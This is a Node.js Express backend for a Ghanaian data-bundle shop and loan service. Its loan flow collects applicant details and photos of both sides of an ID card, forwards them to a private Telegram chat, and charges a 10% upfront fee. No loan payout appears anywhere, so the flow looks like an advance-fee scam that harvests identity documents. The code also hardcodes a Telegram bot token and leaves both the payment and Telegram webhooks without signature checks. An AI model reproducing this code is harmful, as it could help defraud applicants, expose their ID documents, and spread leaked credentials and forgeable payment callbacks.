const express = require('express');
const cors = require('cors');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 5000;

// =============================================
// CONFIGURATION
// =============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8313270294';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const TEST_MODE = false;

const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;
const PAYSTACK_API = 'https://api.paystack.co';

// =============================================
// CORS
// =============================================
app.use(cors({
    origin: [
        'https://databundlesexchange-hkp7.onrender.com',
        'https://easy-loans-gh.onrender.com',
        'https://databundlesexchange-production-86f4.up.railway.app',
        'http://localhost:5500',
        'http://127.0.0.1:5500',
        'http://localhost:3000'
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
    credentials: true
}));

app.options('*', cors());

// =============================================
// MULTER (memory storage for images)
// =============================================
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 8 * 1024 * 1024 }
});

// =============================================
// BODY PARSERS
// =============================================
app.use('/api/paystack/webhook', express.raw({ type: 'application/json' }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// =============================================
// LOGGING
// =============================================
app.use((req, res, next) => {
    console.log(`📥 ${req.method} ${req.path}`);
    if (req.path !== '/api/paystack/webhook' && req.path !== '/api/telegram/webhook') {
        console.log('📦 Body:', req.body);
    }
    next();
});

// =============================================
// TELEGRAM HELPERS
// =============================================
async function sendToTelegram(message, replyMarkup = null) {
    if (TEST_MODE) {
        console.log('📨 [TEST MODE]:', message);
        return { ok: true };
    }
    try {
        const body = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        if (replyMarkup) body.reply_markup = replyMarkup;

        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, body);
        return response.data;
    } catch (error) {
        console.error('❌ Telegram error:', error.response?.data || error.message);
        return { ok: false };
    }
}

async function sendPhotoToTelegram(photoBuffer, filename, caption, replyMarkup = null) {
    try {
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('photo', photoBuffer, { filename });
        form.append('caption', caption);
        form.append('parse_mode', 'HTML');
        if (replyMarkup) form.append('reply_markup', JSON.stringify(replyMarkup));

        const response = await axios.post(`${TELEGRAM_API_URL}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
        return response.data;
    } catch (error) {
        console.error('❌ Telegram photo error:', error.response?.data || error.message);
        return { ok: false };
    }
}

async function answerCallbackQuery(callbackQueryId, text) {
    try {
        await axios.post(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false
        });
    } catch (error) {
        console.error('❌ Callback answer error:', error.message);
    }
}

// =============================================
// STORAGE
// =============================================
const pendingPayments = {};
const loanSessions = {};
const loanApplications = {};

function toPesewas(ghs) { return Math.round(parseFloat(ghs) * 100); }

// =============================================
// HEALTH
// =============================================
app.get('/', (req, res) => {
    res.json({
        status: '✅ Bundle Bazaar + Loans API running!',
        port: PORT,
        testMode: TEST_MODE,
        telegram: '✅ Connected',
        paystack: PAYSTACK_SECRET_KEY ? '✅ Connected' : '❌ Missing Secret Key',
        endpoints: [
            'POST /api/register-vendor/init',
            'POST /api/personal-purchase/init',
            'POST /api/purchase/init',
            'POST /api/recharge/init',
            'POST /api/application',
            'POST /api/id-upload',
            'POST /api/loan/init',
            'GET /api/status/:sessionId',
            'POST /api/paystack/webhook',
            'POST /api/telegram/webhook',
            'GET /api/paystack/verify/:reference',
            'GET /api/health'
        ]
    });
});

app.get('/api/health', (req, res) => {
    res.json({ status: '✅ Healthy', port: PORT, timestamp: new Date().toISOString() });
});

// =============================================
// FORMAT MESSAGES
// =============================================
function formatVendorRegistration(data) {
    return `
🎉 <b>NEW VENDOR REGISTRATION (PAID)!</b>

👤 <b>Full Name:</b> ${data.fullName}
📱 <b>Phone:</b> ${data.phone}
📧 <b>Email:</b> ${data.email}
🏪 <b>Business Name:</b> ${data.business}
📦 <b>Trade Type:</b> ${data.tradeType}
📡 <b>Network:</b> ${data.network}
🎂 <b>Date of Birth:</b> ${data.dob}
🏠 <b>Hometown:</b> ${data.hometown}
📢 <b>Subscribe to HDS Ads:</b> ${data.subscribeHDS ? '✅ YES' : '❌ NO'}

💳 <b>PAYMENT CONFIRMED</b>
💰 <b>Amount:</b> GHS 100.00
🔖 <b>Reference:</b> ${data.reference}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

function formatPersonalPurchase(data) {
    return `
🛒 <b>NEW PERSONAL USER PURCHASE (PAID)!</b>

📦 <b>Package:</b> ${data.package}
💰 <b>Amount:</b> ${data.price}
📱 <b>Phone:</b> ${data.phone}

💳 <b>PAYMENT CONFIRMED</b>
🔖 <b>Reference:</b> ${data.reference}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

function formatPurchase(data) {
    return `
🛒 <b>NEW AGENT PURCHASE (PAID)!</b>

📦 <b>Package:</b> ${data.package}
💰 <b>Amount:</b> ${data.price}
📱 <b>Phone:</b> ${data.phone}

💳 <b>PAYMENT CONFIRMED</b>
🔖 <b>Reference:</b> ${data.reference}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

function formatRecharge(data) {
    return `
💰 <b>NEW RECHARGE (PAID)!</b>

📦 <b>Package:</b> ${data.package}
💰 <b>Amount:</b> ${data.price}
📱 <b>Phone:</b> ${data.phone}

💳 <b>PAYMENT CONFIRMED</b>
🔖 <b>Reference:</b> ${data.reference}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;
}

// =============================================
// BUNDLE ENDPOINTS
// =============================================

// VENDOR REG INIT
app.post('/api/register-vendor/init', async (req, res) => {
    try {
        const { fullName, phone, email, business, tradeType, network, dob, hometown, subscribeHDS } = req.body;
        if (!fullName || !phone || !email || !business || !tradeType || !network || !dob || !hometown) {
            return res.status(400).json({ success: false, message: '❌ All fields are required!' });
        }
        if (phone.length < 10 || !/^\d+$/.test(phone)) {
            return res.status(400).json({ success: false, message: '❌ Invalid phone' });
        }
        if (!email.includes('@') || !email.includes('.')) {
            return res.status(400).json({ success: false, message: '❌ Invalid email' });
        }

        const reference = 'REG-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        pendingPayments[reference] = {
            type: 'vendor-registration',
            amount: 10000,
            data: { fullName, phone, email, business, tradeType, network, dob, hometown, subscribeHDS: !!subscribeHDS },
            createdAt: Date.now()
        };
        res.json({ success: true, reference, amount: 10000, email });
    } catch (err) {
        console.error('❌ Error:', err);
        res.status(500).json({ success: false, message: '❌ Failed' });
    }
});

// PERSONAL PURCHASE INIT
app.post('/api/personal-purchase/init', async (req, res) => {
    try {
        const { package: packageName, price, phone } = req.body;
        if (!packageName || !price || !phone) {
            return res.status(400).json({ success: false, message: '❌ All fields required!' });
        }
        if (phone.length < 10 || !/^\d+$/.test(phone)) {
            return res.status(400).json({ success: false, message: '❌ Invalid phone' });
        }
        const reference = 'PERS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        const amount = toPesewas(price);
        pendingPayments[reference] = {
            type: 'personal-purchase',
            amount,
            data: { package: packageName, price, phone },
            createdAt: Date.now()
        };
        res.json({ success: true, reference, amount, email: phone + '@bundlebazaar.com' });
    } catch (err) {
        console.error('❌ Error:', err);
        res.status(500).json({ success: false, message: '❌ Failed' });
    }
});

// AGENT PURCHASE INIT
app.post('/api/purchase/init', async (req, res) => {
    try {
        const { package: packageName, price, phone } = req.body;
        if (!packageName || !price || !phone) {
            return res.status(400).json({ success: false, message: '❌ All fields required!' });
        }
        if (phone.length < 10 || !/^\d+$/.test(phone)) {
            return res.status(400).json({ success: false, message: '❌ Invalid phone' });
        }
        const reference = 'AGENT-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        const amount = toPesewas(price);
        pendingPayments[reference] = {
            type: 'agent-purchase',
            amount,
            data: { package: packageName, price, phone },
            createdAt: Date.now()
        };
        res.json({ success: true, reference, amount, email: phone + '@bundlebazaar.com' });
    } catch (err) {
        console.error('❌ Error:', err);
        res.status(500).json({ success: false, message: '❌ Failed' });
    }
});

// RECHARGE INIT
app.post('/api/recharge/init', async (req, res) => {
    try {
        const { package: packageName, price, phone } = req.body;
        if (!packageName || !price || !phone) {
            return res.status(400).json({ success: false, message: '❌ All fields required!' });
        }
        if (phone.length < 10 || !/^\d+$/.test(phone)) {
            return res.status(400).json({ success: false, message: '❌ Invalid phone' });
        }
        const reference = 'RECH-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        const amount = toPesewas(price);
        pendingPayments[reference] = {
            type: 'recharge',
            amount,
            data: { package: packageName, price, phone },
            createdAt: Date.now()
        };
        res.json({ success: true, reference, amount, email: phone + '@bundlebazaar.com' });
    } catch (err) {
        console.error('❌ Error:', err);
        res.status(500).json({ success: false, message: '❌ Failed' });
    }
});

// =============================================
// LOAN ENDPOINTS
// =============================================

// 1. SAVE LOAN APPLICATION
app.post('/api/application', async (req, res) => {
    try {
        const data = req.body;
        const appId = 'APP-' + Date.now();

        loanApplications[appId] = { ...data, appId, createdAt: Date.now() };

        const message = `📝 <b>NEW LOAN APPLICATION</b>

🆔 <b>App ID:</b> <code>${appId}</code>
👤 <b>Name:</b> ${data.firstName} ${data.lastName}
📱 <b>Phone:</b> ${data.phone}
💰 <b>Amount:</b> GHS ${parseInt(data.loanAmount).toLocaleString()}
📅 <b>Term:</b> ${data.loanTerm}
📦 <b>Type:</b> ${data.loanType}
💼 <b>Employment:</b> ${data.employmentStatus}
💵 <b>Annual Income:</b> GHS ${parseInt(data.annualIncome || 0).toLocaleString()}
📄 <b>Purpose:</b> ${data.purpose || '—'}

⏰ ${new Date().toLocaleString()}`;

        await sendToTelegram(message);

        res.json({ success: true, appId });
    } catch (err) {
        console.error('Application error:', err);
        res.status(500).json({ success: false, error: 'Failed to save' });
    }
});

// 2. ID UPLOAD
app.post('/api/id-upload', upload.fields([
    { name: 'front', maxCount: 1 },
    { name: 'back', maxCount: 1 }
]), async (req, res) => {
    try {
        const { phone, firstName, lastName, loanAmount, loanTerm, loanType } = req.body;

        if (!req.files || !req.files.front || !req.files.back) {
            return res.status(400).json({ ok: false, error: 'Both ID images required' });
        }

        const sessionId = 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
        const loanAmt = parseInt(loanAmount, 10) || 0;
        const tenPercent = Math.round(loanAmt * 0.10);

        loanSessions[sessionId] = {
            sessionId,
            phone, firstName, lastName,
            loanAmount: loanAmt,
            loanTerm, loanType,
            tenPercent,
            status: 'pending_payment',
            paymentRef: null,
            createdAt: Date.now()
        };

        const caption = `🆔 <b>NEW ID UPLOAD</b>

🆔 <b>Session:</b> <code>${sessionId}</code>
👤 <b>Name:</b> ${firstName} ${lastName}
📱 <b>Phone:</b> ${phone}
💰 <b>Loan:</b> GHS ${loanAmt.toLocaleString()}
💵 <b>10% Fee:</b> GHS ${tenPercent.toLocaleString()}
📅 <b>Term:</b> ${loanTerm}
📦 <b>Type:</b> ${loanType}

⏰ ${new Date().toLocaleString()}

<i>Waiting for payment confirmation...</i>`;

        await sendPhotoToTelegram(
            req.files.front[0].buffer,
            'front.jpg',
            caption
        );

        await sendPhotoToTelegram(
            req.files.back[0].buffer,
            'back.jpg',
            `⬆️ <b>Back side</b> for session <code>${sessionId}</code>`
        );

        console.log('✅ ID upload saved:', sessionId);
        res.json({ ok: true, sessionId, tenPercent });

    } catch (err) {
        console.error('ID upload error:', err);
        res.status(500).json({ ok: false, error: 'Upload failed' });
    }
});

// 3. LOAN PAYMENT INIT
app.post('/api/loan/init', async (req, res) => {
    try {
        const { sessionId } = req.body;
        const session = loanSessions[sessionId];

        if (!session) {
            return res.status(400).json({ success: false, message: '❌ Invalid session' });
        }

        const reference = 'LOAN-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        const amount = toPesewas(session.tenPercent);

        pendingPayments[reference] = {
            type: 'loan-payment',
            amount,
            sessionId,
            data: {
                package: `Loan Fee — ${session.loanType} (GHS ${session.loanAmount.toLocaleString()})`,
                price: session.tenPercent,
                phone: session.phone
            },
            createdAt: Date.now()
        };

        session.paymentRef = reference;

        res.json({
            success: true,
            reference,
            amount,
            email: session.phone + '@bundlebazaar.com'
        });

    } catch (err) {
        console.error('Loan init error:', err);
        res.status(500).json({ success: false, message: '❌ Failed' });
    }
});

// 4. STATUS POLLING
app.get('/api/status/:sessionId', (req, res) => {
    const session = loanSessions[req.params.sessionId];
    if (!session) {
        return res.json({ ok: false, status: 'not_found' });
    }

    if (Date.now() - session.createdAt > 10 * 60 * 1000) {
        session.status = 'timeout';
    }

    res.json({
        ok: true,
        status: session.status,
        tenPercent: session.tenPercent
    });
});

// =============================================
// TELEGRAM WEBHOOK (APPROVE/REJECT buttons)
// =============================================
app.post('/api/telegram/webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const cb = update.callback_query;
            const data = cb.data;
            const [action, sessionId] = data.split(':');

            const session = loanSessions[sessionId];

            if (!session) {
                await answerCallbackQuery(cb.id, '❌ Session not found');
                return res.sendStatus(200);
            }

            if (action === 'approve') {
                session.status = 'approved';
                await answerCallbackQuery(cb.id, '✅ Approved!');
                await sendToTelegram(
                    `✅ <b>SESSION APPROVED</b>\n\n🆔 <code>${sessionId}</code>\n👤 ${session.firstName} ${session.lastName}\n💰 Loan: GHS ${session.loanAmount.toLocaleString()}\n\n<i>The user has been notified.</i>`
                );
                console.log('✅ Session approved:', sessionId);

            } else if (action === 'reject') {
                session.status = 'rejected';
                await answerCallbackQuery(cb.id, '❌ Rejected');
                await sendToTelegram(
                    `❌ <b>SESSION REJECTED</b>\n\n🆔 <code>${sessionId}</code>\n👤 ${session.firstName} ${session.lastName}\n\n<i>The user will need to re-upload their ID.</i>`
                );
                console.log('❌ Session rejected:', sessionId);
            }
        }

        res.sendStatus(200);
    } catch (err) {
        console.error('Telegram webhook error:', err);
        res.sendStatus(200);
    }
});

// =============================================
// PAYSTACK WEBHOOK
// =============================================
app.post('/api/paystack/webhook', async (req, res) => {
    try {
        let event;
        try {
            event = JSON.parse(req.body.toString());
        } catch {
            event = req.body;
        }

        console.log('📥 Paystack webhook:', event.event);

        if (event.event === 'charge.success') {
            const { reference, amount, status } = event.data;

            if (status === 'success') {
                const pending = pendingPayments[reference];

                if (pending && amount >= pending.amount) {
                    let telegramMsg = '';

                    if (pending.type === 'vendor-registration') {
                        telegramMsg = formatVendorRegistration({ ...pending.data, reference });
                    } else if (pending.type === 'personal-purchase') {
                        telegramMsg = formatPersonalPurchase({ ...pending.data, reference });
                    } else if (pending.type === 'agent-purchase') {
                        telegramMsg = formatPurchase({ ...pending.data, reference });
                    } else if (pending.type === 'recharge') {
                        telegramMsg = formatRecharge({ ...pending.data, reference });
                    } else if (pending.type === 'loan-payment') {
                        const session = loanSessions[pending.sessionId];

                        if (session) {
                            session.status = 'paid';

                            const loanMsg = `💳 <b>LOAN FEE PAID — REVIEW REQUIRED</b>

🆔 <b>Session:</b> <code>${session.sessionId}</code>
👤 <b>Name:</b> ${session.firstName} ${session.lastName}
📱 <b>Phone:</b> ${session.phone}
💰 <b>Loan Amount:</b> GHS ${session.loanAmount.toLocaleString()}
💵 <b>Fee Paid:</b> GHS ${session.tenPercent.toLocaleString()}
🔖 <b>Ref:</b> ${reference}

⏰ ${new Date().toLocaleString()}

<i>Review the ID photos above and choose an action:</i>`;

                            const inlineKeyboard = {
                                inline_keyboard: [[
                                    { text: '✅ APPROVE', callback_data: `approve:${session.sessionId}` },
                                    { text: '❌ REJECT', callback_data: `reject:${session.sessionId}` }
                                ]]
                            };

                            await sendToTelegram(loanMsg, inlineKeyboard);
                            console.log('✅ Loan payment confirmed, buttons sent:', session.sessionId);
                        }
                    }

                    if (telegramMsg) {
                        await sendToTelegram(telegramMsg);
                        console.log('✅ Telegram sent for:', reference);
                    }

                    delete pendingPayments[reference];
                }
            }
        }

        res.sendStatus(200);
    } catch (err) {
        console.error('❌ Webhook error:', err);
        res.sendStatus(200);
    }
});

// =============================================
// VERIFY PAYMENT
// =============================================
app.get('/api/paystack/verify/:reference', async (req, res) => {
    try {
        if (!PAYSTACK_SECRET_KEY) {
            return res.status(500).json({ success: false, message: '❌ Paystack not configured' });
        }

        const response = await axios.get(
            `${PAYSTACK_API}/transaction/verify/${req.params.reference}`,
            { headers: { Authorization: `Bearer ${PAYSTACK_SECRET_KEY}` } }
        );

        const data = response.data;
        if (data.status && data.data.status === 'success') {
            res.json({ success: true, status: 'success', amount: data.data.amount });
        } else {
            res.json({ success: false, status: data.data?.status || 'pending' });
        }
    } catch (err) {
        console.error('Verify error:', err.response?.data || err.message);
        res.status(500).json({ success: false, message: '❌ Verification failed' });
    }
});

// =============================================
// 404
// =============================================
app.use((req, res) => {
    res.status(404).json({ success: false, message: '❌ Not found', path: req.path });
});

// =============================================
// SETUP TELEGRAM WEBHOOK ON START
// =============================================
async function setupTelegramWebhook() {
    try {
        const webhookUrl = process.env.RAILWAY_PUBLIC_DOMAIN
            ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/api/telegram/webhook`
            : 'https://databundlesexchange-production-86f4.up.railway.app/api/telegram/webhook';

        const response = await axios.post(`${TELEGRAM_API_URL}/setWebhook`, {
            url: webhookUrl,
            allowed_updates: ['callback_query', 'message']
        });

        console.log('🔗 Telegram webhook set:', response.data);
    } catch (err) {
        console.error('⚠️ Failed to set webhook:', err.response?.data || err.message);
    }
}

// =============================================
// START
// =============================================
app.listen(PORT, '0.0.0.0', async () => {
    console.log('='.repeat(55));
    console.log(`🚀 Bundle Bazaar + Loans Backend running on port ${PORT}`);
    console.log(`🤖 Telegram: ✅ Configured`);
    console.log(`💰 Paystack: ${PAYSTACK_SECRET_KEY ? '✅ Connected' : '❌ MISSING'}`);
    console.log('='.repeat(55));

    await setupTelegramWebhook();
});
